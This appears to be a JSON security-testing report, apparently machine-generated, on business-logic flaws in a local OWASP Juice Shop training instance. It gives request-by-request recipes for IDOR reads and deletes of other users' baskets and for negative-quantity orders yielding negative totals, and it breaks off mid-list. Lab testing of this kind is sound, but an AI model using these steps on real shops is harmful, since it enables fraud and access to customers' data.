{
  "ok": true,
  "summary": "Tested business logic vulnerabilities on OWASP Juice Shop at http://127.0.0.1:3010. Confirmed multiple IDOR vulnerabilities: GET /api/BasketItems exposes all users' basket items, DELETE/PUT/POST on /api/BasketItems operates without basket ownership checks (deleted item from admin's basket), /rest/basket/{id} reveals any user's basket contents, and /rest/basket/{bid}/coupon/{code} applies coupons to any basket. Found critical quantity manipulation flaw: negative quantities are accepted and result in negative order totals (submitted order with -1 qty of $5000 item produced totalPrice=-5000). Decimal quantities (0.5) are also stored. The /rest/track-order/{orderId} endpoint requires zero authentication, exposing order details (email, products, prices) to anyone. Coupon codes (WMNSDY*, ORANGE*) exist client-side but are date-gated campaigns; server-side coupons appear to use different codes. Order checkout processes without payment validation, allowing orders with manipulated totals.",
  "surfaces": [
    {
      "location": "http://127.0.0.1:3010/api/BasketItems",
      "kind": "api",
      "params": ["ProductId", "BasketId", "quantity", "id"],
      "auth": "token"
    },
    {
      "location": "http://127.0.0.1:3010/rest/basket/{id}",
      "kind": "api",
      "params": ["id"],
      "auth": "token"
    },
    {
      "location": "http://127.0.0.1:3010/rest/basket/{bid}/checkout",
      "kind": "api",
      "params": ["couponData", "orderDetails"],
      "auth": "token"
    },
    {
      "location": "http://127.0.0.1:3010/rest/basket/{bid}/coupon/{code}",
      "kind": "api",
      "params": ["bid", "code"],
      "auth": "token"
    },
    {
      "location": "http://127.0.0.1:3010/rest/order-history",
      "kind": "api",
      "params": [],
      "auth": "token"
    },
    {
      "location": "http://127.0.0.1:3010/rest/track-order/{orderId}",
      "kind": "api",
      "params": ["orderId"],
      "auth": "none"
    },
    {
      "location": "http://127.0.0.1:3010/api/Quantitys",
      "kind": "api",
      "params": [],
      "auth": "token"
    },
    {
      "location": "http://127.0.0.1:3010/rest/products/search",
      "kind": "api",
      "params": ["q"],
      "auth": "none"
    }
  ],
  "candidates": [
    {
      "title": "IDOR - BasketItems API exposes all users' basket items",
      "location": "http://127.0.0.1:3010/api/BasketItems",
      "claim": "Any authenticated user can read all basket items across all users by calling GET /api/BasketItems without ownership filtering.",
      "proof_excerpt": "\"status\":\"success\",\"data\":[{\"ProductId\":1,\"BasketId\":1,\"id\":1,\"quantity\":2},{\"ProductId\":2,\"BasketId\":1,\"id\":2,\"quantity\":3},{\"ProductId\":3,\"BasketId\":1,\"id\":3,\"quantity\":1},{\"ProductId\":4,\"BasketId\":2,\"id\":4,\"quantity\":2},{\"ProductId\":4,\"BasketId\":3,\"id\":5,\"quantity\":1},{\"ProductId\":4,\"BasketId\":4,\"id\":6,\"quantity\":2},{\"ProductId\":3,\"BasketId\":5,\"id\":7,\"quantity\":5},{\"ProductId\":4,\"BasketId\":5,\"id\":8,\"quantity\":2}]",
      "poc_hint": "GET /api/BasketItems with any valid JWT token. Returns basket items for BasketId 1 through 5 (admin and other users) - no ownership check."
    },
    {
      "title": "IDOR - DELETE on BasketItems removes items from other users' baskets",
      "location": "http://127.0.0.1:3010/api/BasketItems/{id}",
      "claim": "Authenticated user can DELETE basket items belonging to other users via direct ID reference. Deleted item 3 (Eggfruit Juice) from admin's basket (BasketId=1).",
      "proof_excerpt": "{\"status\":\"success\",\"data\":{}} (after DELETE /api/BasketItems/3 which belonged to BasketId=1, confirmed by checking /rest/basket/1 which showed only 1 remaining product instead of 2)",
      "poc_hint": "1) GET /api/BasketItems to find items in other baskets. 2) DELETE /api/BasketItems/{id} with any valid token. 3) Verify via GET /rest/basket/{BasketId} the item is removed."
    },
    {
      "title": "IDOR - /rest/basket/{id} reveals any user's basket contents",
      "location": "http://127.0.0.1:3010/rest/basket/{id}",
      "claim": "Any authenticated user can read the contents of any basket by providing its numeric ID. Successfully read basket 1 (admin) from user with BasketId=8.",
      "proof_excerpt": "\"status\":\"success\",\"data\":{\"id\":1,\"coupon\":null,\"UserId\":1,\"createdAt\":\"2026-07-24T00:33:45.808Z\",\"updatedAt\":\"2026-07-24T00:33:45.808Z\",\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"price\":1.99,\"BasketItem\":{\"ProductId\":1,\"BasketId\":1,\"id\":1,\"quantity\":2}}]}",
      "poc_hint": "GET /rest/basket/1 with any valid JWT token (even though our user has BasketId=8). Returns admin's basket with products."
    },
    {
      "title": "Quantity Manipulation - Negative quantities accepted and processed in orders",
      "location": "http://127.0.0.1:3010/api/BasketItems",
      "claim": "POST/PUT on BasketItems accepts negative quantity values, leading to negative order totals. Placed order with -1 qty of $5000 artwork producing totalPrice=-5000.",
      "proof_excerpt": "\"orderConfirmation\":\"a8bf-dcc09b094d1b57eb\" (followed by order-history showing {\"totalPrice\":-5000,\"products\":[{\"quantity\":-1,\"name\":\"Best Juice Shop Salesman Artwork\",\"price\":5000,\"total\":-5000}]})",
      "poc_hint": "1) POST /api/BasketItems with {\"ProductId\":42,\"BasketId\":8,\"quantity\":-1}. 2) POST /rest/basket/8/checkout. 3) GET /rest/order-history to see totalPrice=-5000."
    },
    {
      "title": "Quantity Manipulation - Decimal quantities accepted",
      "location": "http://127.0.0.1:3010/api/BasketItems",
      "claim": "POST on BasketItems accepts non-integer quantity values (0.5). Validation isInt only during checkout but storage allows decimals.",
      "proof_excerpt": "\"status\":\"success\",\"data\":{\"id\":10,\"ProductId\":2,\"BasketId\":8,\"quantity\":0.5,\"createdAt\":\"2026-07-24T00:46:49.409Z\"}",
      "poc_hint": "POST /api/BasketItems with {\"ProductId\":2,\"BasketId\":8,\"quantity\":0.5}. Returns success with stored decimal quantity."
    },
